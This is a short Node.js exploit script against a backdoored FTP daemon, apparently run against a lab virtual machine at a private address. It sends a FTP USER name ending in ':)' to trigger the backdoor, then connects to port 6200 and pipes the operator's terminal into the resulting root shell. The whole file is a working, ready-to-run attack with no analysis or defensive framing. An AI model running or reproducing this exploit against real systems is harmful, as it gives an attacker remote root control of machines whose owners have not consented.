import net from "net";

const TARGET_IP = "192.168.0.167";
const FTP_PORT = 21;
const BACKDOOR_PORT = 6200;

console.log(`🚀 Sending Layer 7 magic payload to ${TARGET_IP}:${FTP_PORT}...`);

// 1. Establish the connection to the vulnerable FTP daemon
const ftpSocket = net.createConnection(
  { port: FTP_PORT, host: TARGET_IP },
  () => {
    // According to the FTP protocol rules, we send our strings terminated with \r\n
    ftpSocket.write("USER backdoor_nabil:)\r\n");
    ftpSocket.write("PASS password123\r\n");
  },
);

ftpSocket.on("data", (data) => {
  console.log(`[FTP Server]: ${data.toString().trim()}`);
});

// 2. Wait 1.5 seconds for the C program inside the VM to execute the shell on Port 6200
setTimeout(() => {
  console.log(
    `🔗 Attempting to hook into secret Backdoor Port ${BACKDOOR_PORT}...`,
  );

  const shellSocket = net.createConnection(
    { port: BACKDOOR_PORT, host: TARGET_IP },
    () => {
      console.log(
        "🎯 SUCCESS! Connected to the Root Shell. Type commands directly below:\n",
      );

      // Pipe your terminal's standard input straight into the remote server's network socket
      process.stdin.pipe(shellSocket);
    },
  );

  // Pipe whatever the remote machine's root terminal prints straight out to your screen
  shellSocket.pipe(process.stdout);

  shellSocket.on("error", () => {
    console.error("❌ Failed to connect to port 6200. Is the target correct?");
    ftpSocket.end();
  });
}, 1500);
